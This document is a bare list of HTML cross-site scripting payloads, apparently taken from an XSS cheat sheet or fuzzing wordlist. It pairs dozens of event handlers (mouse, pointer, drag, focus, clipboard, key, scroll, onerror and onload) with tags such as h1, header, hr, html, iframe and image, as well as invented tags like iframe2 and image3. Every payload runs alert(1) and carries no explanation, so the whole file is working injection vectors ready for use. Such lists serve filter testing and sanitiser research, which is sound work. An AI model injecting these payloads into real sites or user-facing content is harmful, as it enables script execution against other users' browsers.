<h1 onmouseup="alert(1)" style=display:block>test</h1>
<h1 onmousewheel=alert(1) style=display:block>requires scrolling
<h1 onpaste="alert(1)" contenteditable>test</h1>
<h1 onpointerdown=alert(1) style=display:block>XSS</h1>
<h1 onpointerenter=alert(1) style=display:block>XSS</h1>
<h1 onpointerleave=alert(1) style=display:block>XSS</h1>
<h1 onpointermove=alert(1) style=display:block>XSS</h1>
<h1 onpointerout=alert(1) style=display:block>XSS</h1>
<h1 onpointerover=alert(1) style=display:block>XSS</h1>
<h1 onpointerrawupdate=alert(1) style=display:block>XSS</h1>
<h1 onpointerup=alert(1) style=display:block>XSS</h1>
<h1 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></h1>
<head contenteditable onbeforeinput=alert(1)>test
<head draggable="true" ondrag="alert(1)" style=display:block>test</head>
<head draggable="true" ondragend="alert(1)" style=display:block>test</head>
<head draggable="true" ondragenter="alert(1)" style=display:block>test</head>
<head draggable="true" ondragleave="alert(1)" style=display:block>test</head>
<head draggable="true" ondragstart="alert(1)" style=display:block>test</head>
<head id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></head>
<head id=x tabindex=1 onfocus=alert(1) style=display:block></head>
<head id=x tabindex=1 onfocusin=alert(1) style=display:block></head>
<head onafterscriptexecute=alert(1)><script>1</script>
<head onbeforecopy="alert(1)" contenteditable style=display:block>test</head>
<head onbeforecut="alert(1)" contenteditable style=display:block>test</head>
<head onbeforescriptexecute=alert(1)><script>1</script>
<head onblur=alert(1) id=x tabindex=1 style=display:block>test</head><input value=clickme>
<head onclick="alert(1)" style=display:block>test</head>
<head oncontextmenu="alert(1)" style=display:block>test</head>
<head oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<head oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<head ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</head>
<head onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</head><input value=clickme>
<head onkeydown="alert(1)" contenteditable style=display:block>test</head>
<head onkeypress="alert(1)" contenteditable style=display:block>test</head>
<head onkeyup="alert(1)" contenteditable style=display:block>test</head>
<head onmousedown="alert(1)" style=display:block>test</head>
<head onmouseenter="alert(1)" style=display:block>test</head>
<head onmouseleave="alert(1)" style=display:block>test</head>
<head onmousemove="alert(1)" style=display:block>test</head>
<head onmouseout="alert(1)" style=display:block>test</head>
<head onmouseover="alert(1)" style=display:block>test</head>
<head onmouseup="alert(1)" style=display:block>test</head>
<head onmousewheel=alert(1) style=display:block>requires scrolling
<head onpaste="alert(1)" contenteditable style=display:block>test</head>
<head onpointerdown=alert(1) style=display:block>XSS</head>
<head onpointerenter=alert(1) style=display:block>XSS</head>
<head onpointerleave=alert(1) style=display:block>XSS</head>
<head onpointermove=alert(1) style=display:block>XSS</head>
<head onpointerout=alert(1) style=display:block>XSS</head>
<head onpointerover=alert(1) style=display:block>XSS</head>
<head onpointerrawupdate=alert(1) style=display:block>XSS</head>
<head onpointerup=alert(1) style=display:block>XSS</head>
<head onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></head>
<header contenteditable onbeforeinput=alert(1)>test
<header draggable="true" ondrag="alert(1)" style=display:block>test</header>
<header draggable="true" ondragend="alert(1)" style=display:block>test</header>
<header draggable="true" ondragenter="alert(1)" style=display:block>test</header>
<header draggable="true" ondragleave="alert(1)" style=display:block>test</header>
<header draggable="true" ondragstart="alert(1)" style=display:block>test</header>
<header id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></header>
<header id=x tabindex=1 onfocus=alert(1)></header>
<header id=x tabindex=1 onfocusin=alert(1)></header>
<header onafterscriptexecute=alert(1)><script>1</script>
<header onbeforecopy="alert(1)" contenteditable>test</header>
<header onbeforecut="alert(1)" contenteditable>test</header>
<header onbeforescriptexecute=alert(1)><script>1</script>
<header onblur=alert(1) id=x tabindex=1 style=display:block>test</header><input value=clickme>
<header onclick="alert(1)" style=display:block>test</header>
<header oncontextmenu="alert(1)" style=display:block>test</header>
<header oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<header oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<header ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</header>
<header onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</header><input value=clickme>
<header onkeydown="alert(1)" contenteditable style=display:block>test</header>
<header onkeypress="alert(1)" contenteditable style=display:block>test</header>
<header onkeyup="alert(1)" contenteditable style=display:block>test</header>
<header onmousedown="alert(1)" style=display:block>test</header>
<header onmouseenter="alert(1)" style=display:block>test</header>
<header onmouseleave="alert(1)" style=display:block>test</header>
<header onmousemove="alert(1)" style=display:block>test</header>
<header onmouseout="alert(1)" style=display:block>test</header>
<header onmouseover="alert(1)" style=display:block>test</header>
<header onmouseup="alert(1)" style=display:block>test</header>
<header onmousewheel=alert(1) style=display:block>requires scrolling
<header onpaste="alert(1)" contenteditable>test</header>
<header onpointerdown=alert(1) style=display:block>XSS</header>
<header onpointerenter=alert(1) style=display:block>XSS</header>
<header onpointerleave=alert(1) style=display:block>XSS</header>
<header onpointermove=alert(1) style=display:block>XSS</header>
<header onpointerout=alert(1) style=display:block>XSS</header>
<header onpointerover=alert(1) style=display:block>XSS</header>
<header onpointerrawupdate=alert(1) style=display:block>XSS</header>
<header onpointerup=alert(1) style=display:block>XSS</header>
<header onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></header>
<hgroup contenteditable onbeforeinput=alert(1)>test
<hgroup draggable="true" ondrag="alert(1)" style=display:block>test</hgroup>
<hgroup draggable="true" ondragend="alert(1)" style=display:block>test</hgroup>
<hgroup draggable="true" ondragenter="alert(1)" style=display:block>test</hgroup>
<hgroup draggable="true" ondragleave="alert(1)" style=display:block>test</hgroup>
<hgroup draggable="true" ondragstart="alert(1)" style=display:block>test</hgroup>
<hgroup id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></hgroup>
<hgroup id=x tabindex=1 onfocus=alert(1)></hgroup>
<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>
<hgroup onafterscriptexecute=alert(1)><script>1</script>
<hgroup onbeforecopy="alert(1)" contenteditable>test</hgroup>
<hgroup onbeforecut="alert(1)" contenteditable>test</hgroup>
<hgroup onbeforescriptexecute=alert(1)><script>1</script>
<hgroup onblur=alert(1) id=x tabindex=1 style=display:block>test</hgroup><input value=clickme>
<hgroup onclick="alert(1)" style=display:block>test</hgroup>
<hgroup oncontextmenu="alert(1)" style=display:block>test</hgroup>
<hgroup oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<hgroup oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<hgroup ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</hgroup>
<hgroup onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</hgroup><input value=clickme>
<hgroup onkeydown="alert(1)" contenteditable style=display:block>test</hgroup>
<hgroup onkeypress="alert(1)" contenteditable style=display:block>test</hgroup>
<hgroup onkeyup="alert(1)" contenteditable style=display:block>test</hgroup>
<hgroup onmousedown="alert(1)" style=display:block>test</hgroup>
<hgroup onmouseenter="alert(1)" style=display:block>test</hgroup>
<hgroup onmouseleave="alert(1)" style=display:block>test</hgroup>
<hgroup onmousemove="alert(1)" style=display:block>test</hgroup>
<hgroup onmouseout="alert(1)" style=display:block>test</hgroup>
<hgroup onmouseover="alert(1)" style=display:block>test</hgroup>
<hgroup onmouseup="alert(1)" style=display:block>test</hgroup>
<hgroup onmousewheel=alert(1) style=display:block>requires scrolling
<hgroup onpaste="alert(1)" contenteditable>test</hgroup>
<hgroup onpointerdown=alert(1) style=display:block>XSS</hgroup>
<hgroup onpointerenter=alert(1) style=display:block>XSS</hgroup>
<hgroup onpointerleave=alert(1) style=display:block>XSS</hgroup>
<hgroup onpointermove=alert(1) style=display:block>XSS</hgroup>
<hgroup onpointerout=alert(1) style=display:block>XSS</hgroup>
<hgroup onpointerover=alert(1) style=display:block>XSS</hgroup>
<hgroup onpointerrawupdate=alert(1) style=display:block>XSS</hgroup>
<hgroup onpointerup=alert(1) style=display:block>XSS</hgroup>
<hgroup onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></hgroup>
<hr contenteditable onbeforeinput=alert(1)>test
<hr draggable="true" ondrag="alert(1)" style=display:block>test</hr>
<hr draggable="true" ondragend="alert(1)" style=display:block>test</hr>
<hr draggable="true" ondragenter="alert(1)" style=display:block>test</hr>
<hr draggable="true" ondragleave="alert(1)" style=display:block>test</hr>
<hr draggable="true" ondragstart="alert(1)" style=display:block>test</hr>
<hr id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></hr>
<hr id=x tabindex=1 onfocus=alert(1)></hr>
<hr id=x tabindex=1 onfocusin=alert(1)></hr>
<hr onafterscriptexecute=alert(1)><script>1</script>
<hr onbeforecopy="alert(1)" contenteditable>test</hr>
<hr onbeforecut="alert(1)" contenteditable>test</hr>
<hr onbeforescriptexecute=alert(1)><script>1</script>
<hr onblur=alert(1) id=x tabindex=1 style=display:block>test</hr><input value=clickme>
<hr onclick="alert(1)" style=display:block>test</hr>
<hr oncontextmenu="alert(1)" style=display:block>test</hr>
<hr oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<hr oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<hr ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</hr>
<hr onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</hr><input value=clickme>
<hr onkeydown="alert(1)" contenteditable style=display:block>test</hr>
<hr onkeypress="alert(1)" contenteditable style=display:block>test</hr>
<hr onkeyup="alert(1)" contenteditable style=display:block>test</hr>
<hr onmousedown="alert(1)" style=display:block>test</hr>
<hr onmouseenter="alert(1)" style=display:block>test</hr>
<hr onmouseleave="alert(1)" style=display:block>test</hr>
<hr onmousemove="alert(1)" style=display:block>test</hr>
<hr onmouseout="alert(1)" style=display:block>test</hr>
<hr onmouseover="alert(1)" style=display:block>test</hr>
<hr onmouseup="alert(1)" style=display:block>test</hr>
<hr onmousewheel=alert(1) style=display:block>requires scrolling
<hr onpaste="alert(1)" contenteditable>test</hr>
<hr onpointerdown=alert(1) style=display:block>XSS</hr>
<hr onpointerenter=alert(1) style=display:block>XSS</hr>
<hr onpointerleave=alert(1) style=display:block>XSS</hr>
<hr onpointermove=alert(1) style=display:block>XSS</hr>
<hr onpointerout=alert(1) style=display:block>XSS</hr>
<hr onpointerover=alert(1) style=display:block>XSS</hr>
<hr onpointerrawupdate=alert(1) style=display:block>XSS</hr>
<hr onpointerup=alert(1) style=display:block>XSS</hr>
<hr onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></hr>
<html contenteditable onbeforeinput=alert(1)>test
<html draggable="true" ondrag="alert(1)" style=display:block>test</html>
<html draggable="true" ondragend="alert(1)" style=display:block>test</html>
<html draggable="true" ondragenter="alert(1)" style=display:block>test</html>
<html draggable="true" ondragleave="alert(1)" style=display:block>test</html>
<html draggable="true" ondragstart="alert(1)" style=display:block>test</html>
<html id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></html>
<html id=x tabindex=1 onfocus=alert(1)></html>
<html id=x tabindex=1 onfocusin=alert(1)></html>
<html onafterscriptexecute=alert(1)><script>1</script>
<html onbeforecopy="alert(1)" contenteditable>test</html>
<html onbeforecut="alert(1)" contenteditable>test</html>
<html onbeforescriptexecute=alert(1)><script>1</script>
<html onblur=alert(1) id=x tabindex=1 style=display:block>test</html><input value=clickme>
<html onclick="alert(1)" style=display:block>test</html>
<html oncontextmenu="alert(1)" style=display:block>test</html>
<html oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<html oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<html ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</html>
<html onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</html><input value=clickme>
<html onkeydown="alert(1)" contenteditable style=display:block>test</html>
<html onkeypress="alert(1)" contenteditable style=display:block>test</html>
<html onkeyup="alert(1)" contenteditable style=display:block>test</html>
<html onmousedown="alert(1)" style=display:block>test</html>
<html onmouseenter="alert(1)" style=display:block>test</html>
<html onmouseleave="alert(1)" style=display:block>test</html>
<html onmousemove="alert(1)" style=display:block>test</html>
<html onmouseout="alert(1)" style=display:block>test</html>
<html onmouseover="alert(1)" style=display:block>test</html>
<html onmouseup="alert(1)" style=display:block>test</html>
<html onmousewheel=alert(1) style=display:block>requires scrolling
<html onpaste="alert(1)" contenteditable>test</html>
<html onpointerdown=alert(1) style=display:block>XSS</html>
<html onpointerenter=alert(1) style=display:block>XSS</html>
<html onpointerleave=alert(1) style=display:block>XSS</html>
<html onpointermove=alert(1) style=display:block>XSS</html>
<html onpointerout=alert(1) style=display:block>XSS</html>
<html onpointerover=alert(1) style=display:block>XSS</html>
<html onpointerrawupdate=alert(1) style=display:block>XSS</html>
<html onpointerup=alert(1) style=display:block>XSS</html>
<html onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></html>
<i contenteditable onbeforeinput=alert(1)>test
<i draggable="true" ondrag="alert(1)" style=display:block>test</i>
<i draggable="true" ondragend="alert(1)" style=display:block>test</i>
<i draggable="true" ondragenter="alert(1)" style=display:block>test</i>
<i draggable="true" ondragleave="alert(1)" style=display:block>test</i>
<i draggable="true" ondragstart="alert(1)" style=display:block>test</i>
<i id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></i>
<i id=x tabindex=1 onfocus=alert(1)></i>
<i id=x tabindex=1 onfocusin=alert(1)></i>
<i onafterscriptexecute=alert(1)><script>1</script>
<i onbeforecopy="alert(1)" contenteditable>test</i>
<i onbeforecut="alert(1)" contenteditable>test</i>
<i onbeforescriptexecute=alert(1)><script>1</script>
<i onblur=alert(1) id=x tabindex=1 style=display:block>test</i><input value=clickme>
<i onclick="alert(1)" style=display:block>test</i>
<i oncontextmenu="alert(1)" style=display:block>test</i>
<i oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<i oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<i ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</i>
<i onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</i><input value=clickme>
<i onkeydown="alert(1)" contenteditable style=display:block>test</i>
<i onkeypress="alert(1)" contenteditable style=display:block>test</i>
<i onkeyup="alert(1)" contenteditable style=display:block>test</i>
<i onmousedown="alert(1)" style=display:block>test</i>
<i onmouseenter="alert(1)" style=display:block>test</i>
<i onmouseleave="alert(1)" style=display:block>test</i>
<i onmousemove="alert(1)" style=display:block>test</i>
<i onmouseout="alert(1)" style=display:block>test</i>
<i onmouseover="alert(1)" style=display:block>test</i>
<i onmouseup="alert(1)" style=display:block>test</i>
<i onmousewheel=alert(1) style=display:block>requires scrolling
<i onpaste="alert(1)" contenteditable>test</i>
<i onpointerdown=alert(1) style=display:block>XSS</i>
<i onpointerenter=alert(1) style=display:block>XSS</i>
<i onpointerleave=alert(1) style=display:block>XSS</i>
<i onpointermove=alert(1) style=display:block>XSS</i>
<i onpointerout=alert(1) style=display:block>XSS</i>
<i onpointerover=alert(1) style=display:block>XSS</i>
<i onpointerrawupdate=alert(1) style=display:block>XSS</i>
<i onpointerup=alert(1) style=display:block>XSS</i>
<i onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></i>
<iframe autofocus onfocus=alert(1)>
<iframe autofocus onfocusin=alert(1)>
<iframe contenteditable onbeforeinput=alert(1)>test
<iframe draggable="true" ondrag="alert(1)" style=display:block>test</iframe>
<iframe draggable="true" ondragend="alert(1)" style=display:block>test</iframe>
<iframe draggable="true" ondragenter="alert(1)" style=display:block>test</iframe>
<iframe draggable="true" ondragleave="alert(1)" style=display:block>test</iframe>
<iframe draggable="true" ondragstart="alert(1)" style=display:block>test</iframe>
<iframe id=x onfocus=alert(1)>
<iframe id=x onfocusin=alert(1)>
<iframe id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></iframe>
<iframe onafterscriptexecute=alert(1)><script>1</script>
<iframe onbeforecopy="alert(1)" contenteditable>test</iframe>
<iframe onbeforecut="alert(1)" contenteditable>test</iframe>
<iframe onbeforescriptexecute=alert(1)><script>1</script>
<iframe onblur=alert(1) id=x tabindex=1 style=display:block>test</iframe><input value=clickme>
<iframe onclick="alert(1)" style=display:block>test</iframe>
<iframe oncontextmenu="alert(1)" style=display:block>test</iframe>
<iframe oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<iframe oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<iframe ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</iframe>
<iframe onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</iframe><input value=clickme>
<iframe onkeydown="alert(1)" contenteditable style=display:block>test</iframe>
<iframe onkeypress="alert(1)" contenteditable style=display:block>test</iframe>
<iframe onkeyup="alert(1)" contenteditable style=display:block>test</iframe>
<iframe onload=alert(1)></iframe>
<iframe onmousedown="alert(1)" style=display:block>test</iframe>
<iframe onmouseenter="alert(1)" style=display:block>test</iframe>
<iframe onmouseleave="alert(1)" style=display:block>test</iframe>
<iframe onmousemove="alert(1)" style=display:block>test</iframe>
<iframe onmouseout="alert(1)" style=display:block>test</iframe>
<iframe onmouseover="alert(1)" style=display:block>test</iframe>
<iframe onmouseup="alert(1)" style=display:block>test</iframe>
<iframe onmousewheel=alert(1) style=display:block>requires scrolling
<iframe onpaste="alert(1)" contenteditable>test</iframe>
<iframe onpointerdown=alert(1) style=display:block>XSS</iframe>
<iframe onpointerenter=alert(1) style=display:block>XSS</iframe>
<iframe onpointerleave=alert(1) style=display:block>XSS</iframe>
<iframe onpointermove=alert(1) style=display:block>XSS</iframe>
<iframe onpointerout=alert(1) style=display:block>XSS</iframe>
<iframe onpointerover=alert(1) style=display:block>XSS</iframe>
<iframe onpointerrawupdate=alert(1) style=display:block>XSS</iframe>
<iframe onpointerup=alert(1) style=display:block>XSS</iframe>
<iframe onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></iframe>
<iframe2 contenteditable onbeforeinput=alert(1)>test
<iframe2 draggable="true" ondrag="alert(1)" style=display:block>test</iframe2>
<iframe2 draggable="true" ondragend="alert(1)" style=display:block>test</iframe2>
<iframe2 draggable="true" ondragenter="alert(1)" style=display:block>test</iframe2>
<iframe2 draggable="true" ondragleave="alert(1)" style=display:block>test</iframe2>
<iframe2 draggable="true" ondragstart="alert(1)" style=display:block>test</iframe2>
<iframe2 id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></iframe2>
<iframe2 onafterscriptexecute=alert(1)><script>1</script>
<iframe2 onbeforescriptexecute=alert(1)><script>1</script>
<iframe2 onblur=alert(1) id=x tabindex=1 style=display:block>test</iframe2><input value=clickme>
<iframe2 onclick="alert(1)" style=display:block>test</iframe2>
<iframe2 oncontextmenu="alert(1)" style=display:block>test</iframe2>
<iframe2 oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<iframe2 oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<iframe2 ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</iframe2>
<iframe2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</iframe2><input value=clickme>
<iframe2 onkeydown="alert(1)" contenteditable style=display:block>test</iframe2>
<iframe2 onkeypress="alert(1)" contenteditable style=display:block>test</iframe2>
<iframe2 onkeyup="alert(1)" contenteditable style=display:block>test</iframe2>
<iframe2 onmousedown="alert(1)" style=display:block>test</iframe2>
<iframe2 onmouseenter="alert(1)" style=display:block>test</iframe2>
<iframe2 onmouseleave="alert(1)" style=display:block>test</iframe2>
<iframe2 onmousemove="alert(1)" style=display:block>test</iframe2>
<iframe2 onmouseout="alert(1)" style=display:block>test</iframe2>
<iframe2 onmouseover="alert(1)" style=display:block>test</iframe2>
<iframe2 onmouseup="alert(1)" style=display:block>test</iframe2>
<iframe2 onmousewheel=alert(1) style=display:block>requires scrolling
<iframe2 onpointerdown=alert(1) style=display:block>XSS</iframe2>
<iframe2 onpointerenter=alert(1) style=display:block>XSS</iframe2>
<iframe2 onpointerleave=alert(1) style=display:block>XSS</iframe2>
<iframe2 onpointermove=alert(1) style=display:block>XSS</iframe2>
<iframe2 onpointerout=alert(1) style=display:block>XSS</iframe2>
<iframe2 onpointerover=alert(1) style=display:block>XSS</iframe2>
<iframe2 onpointerrawupdate=alert(1) style=display:block>XSS</iframe2>
<iframe2 onpointerup=alert(1) style=display:block>XSS</iframe2>
<iframe2 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></iframe2>
<image contenteditable onbeforeinput=alert(1)>test
<image draggable="true" ondrag="alert(1)" style=display:block>test</image>
<image draggable="true" ondragend="alert(1)" style=display:block>test</image>
<image draggable="true" ondragenter="alert(1)" style=display:block>test</image>
<image draggable="true" ondragleave="alert(1)" style=display:block>test</image>
<image draggable="true" ondragstart="alert(1)" style=display:block>test</image>
<image id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></image>
<image id=x tabindex=1 onfocus=alert(1)></image>
<image id=x tabindex=1 onfocusin=alert(1)></image>
<image onafterscriptexecute=alert(1)><script>1</script>
<image onbeforecopy="alert(1)" contenteditable>test</image>
<image onbeforecut="alert(1)" contenteditable>test</image>
<image onbeforescriptexecute=alert(1)><script>1</script>
<image onblur=alert(1) id=x tabindex=1 style=display:block>test</image><input value=clickme>
<image onclick="alert(1)" style=display:block>test</image>
<image oncontextmenu="alert(1)" style=display:block>test</image>
<image oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<image oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<image ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</image>
<image onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</image><input value=clickme>
<image onkeydown="alert(1)" contenteditable style=display:block>test</image>
<image onkeypress="alert(1)" contenteditable style=display:block>test</image>
<image onkeyup="alert(1)" contenteditable style=display:block>test</image>
<image onmousedown="alert(1)" style=display:block>test</image>
<image onmouseenter="alert(1)" style=display:block>test</image>
<image onmouseleave="alert(1)" style=display:block>test</image>
<image onmousemove="alert(1)" style=display:block>test</image>
<image onmouseout="alert(1)" style=display:block>test</image>
<image onmouseover="alert(1)" style=display:block>test</image>
<image onmouseup="alert(1)" style=display:block>test</image>
<image onmousewheel=alert(1) style=display:block>requires scrolling
<image onpaste="alert(1)" contenteditable>test</image>
<image onpointerdown=alert(1) style=display:block>XSS</image>
<image onpointerenter=alert(1) style=display:block>XSS</image>
<image onpointerleave=alert(1) style=display:block>XSS</image>
<image onpointermove=alert(1) style=display:block>XSS</image>
<image onpointerout=alert(1) style=display:block>XSS</image>
<image onpointerover=alert(1) style=display:block>XSS</image>
<image onpointerrawupdate=alert(1) style=display:block>XSS</image>
<image onpointerup=alert(1) style=display:block>XSS</image>
<image onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></image>
<image src/onerror=alert(1)>
<image src=validimage.png onload=alert(1)>
<image srcset=1 onerror=alert(1)>
<image2 contenteditable onbeforeinput=alert(1)>test
<image2 draggable="true" ondrag="alert(1)" style=display:block>test</image2>
<image2 draggable="true" ondragend="alert(1)" style=display:block>test</image2>
<image2 draggable="true" ondragenter="alert(1)" style=display:block>test</image2>
<image2 draggable="true" ondragleave="alert(1)" style=display:block>test</image2>
<image2 draggable="true" ondragstart="alert(1)" style=display:block>test</image2>
<image2 id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></image2>
<image2 onafterscriptexecute=alert(1)><script>1</script>
<image2 onbeforescriptexecute=alert(1)><script>1</script>
<image2 onblur=alert(1) id=x tabindex=1 style=display:block>test</image2><input value=clickme>
<image2 onclick="alert(1)" style=display:block>test</image2>
<image2 oncontextmenu="alert(1)" style=display:block>test</image2>
<image2 oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<image2 oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<image2 ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</image2>
<image2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</image2><input value=clickme>
<image2 onkeydown="alert(1)" contenteditable style=display:block>test</image2>
<image2 onkeypress="alert(1)" contenteditable style=display:block>test</image2>
<image2 onkeyup="alert(1)" contenteditable style=display:block>test</image2>
<image2 onmousedown="alert(1)" style=display:block>test</image2>
<image2 onmouseenter="alert(1)" style=display:block>test</image2>
<image2 onmouseleave="alert(1)" style=display:block>test</image2>
<image2 onmousemove="alert(1)" style=display:block>test</image2>
<image2 onmouseout="alert(1)" style=display:block>test</image2>
<image2 onmouseover="alert(1)" style=display:block>test</image2>
<image2 onmouseup="alert(1)" style=display:block>test</image2>
<image2 onmousewheel=alert(1) style=display:block>requires scrolling
<image2 onpointerdown=alert(1) style=display:block>XSS</image2>
<image2 onpointerenter=alert(1) style=display:block>XSS</image2>
<image2 onpointerleave=alert(1) style=display:block>XSS</image2>
<image2 onpointermove=alert(1) style=display:block>XSS</image2>
<image2 onpointerout=alert(1) style=display:block>XSS</image2>
<image2 onpointerover=alert(1) style=display:block>XSS</image2>
<image2 onpointerrawupdate=alert(1) style=display:block>XSS</image2>
<image2 onpointerup=alert(1) style=display:block>XSS</image2>
<image2 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></image2>
<image3 contenteditable onbeforeinput=alert(1)>test
<image3 draggable="true" ondrag="alert(1)" style=display:block>test</image3>
<image3 draggable="true" ondragend="alert(1)" style=display:block>test</image3>
<image3 draggable="true" ondragenter="alert(1)" style=display:block>test</image3>
<image3 draggable="true" ondragleave="alert(1)" style=display:block>test</image3>
<image3 draggable="true" ondragstart="alert(1)" style=display:block>test</image3>
<image3 id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></image3>
<image3 onafterscriptexecute=alert(1)><script>1</script>
<image3 onbeforescriptexecute=alert(1)><script>1</script>
<image3 onblur=alert(1) id=x tabindex=1 style=display:block>test</image3><input value=clickme>
<image3 onclick="alert(1)" style=display:block>test</image3>
<image3 oncontextmenu="alert(1)" style=display:block>test</image3>
<image3 oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<image3 oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<image3 ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</image3>
<image3 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</image3><input value=clickme>
<image3 onkeydown="alert(1)" contenteditable style=display:block>test</image3>
<image3 onkeypress="alert(1)" contenteditable style=display:block>test</image3>
<image3 onkeyup="alert(1)" contenteditable style=display:block>test</image3>
<image3 onmousedown="alert(1)" style=display:block>test</image3>
<image3 onmouseenter="alert(1)" style=display:block>test</image3>
<image3 onmouseleave="alert(1)" style=display:block>test</image3>
<image3 onmousemove="alert(1)" style=display:block>test</image3>
<image3 onmouseout="alert(1)" style=display:block>test</image3>
<image3 onmouseover="alert(1)" style=display:block>test</image3>
<image3 onmouseup="alert(1)" style=display:block>test</image3>
<image3 onmousewheel=alert(1) style=display:block>requires scrolling
<image3 onpointerdown=alert(1) style=display:block>XSS</image3>
<image3 onpointerenter=alert(1) style=display:block>XSS</image3>
<image3 onpointerleave=alert(1) style=display:block>XSS</image3>
<image3 onpointermove=alert(1) style=display:block>XSS</image3>
<image3 onpointerout=alert(1) style=display:block>XSS</image3>
<image3 onpointerover=alert(1) style=display:block>XSS</image3>
<image3 onpointerrawupdate=alert(1) style=display:block>XSS</image3>
<image3 onpointerup=alert(1) style=display:block>XSS</image3>
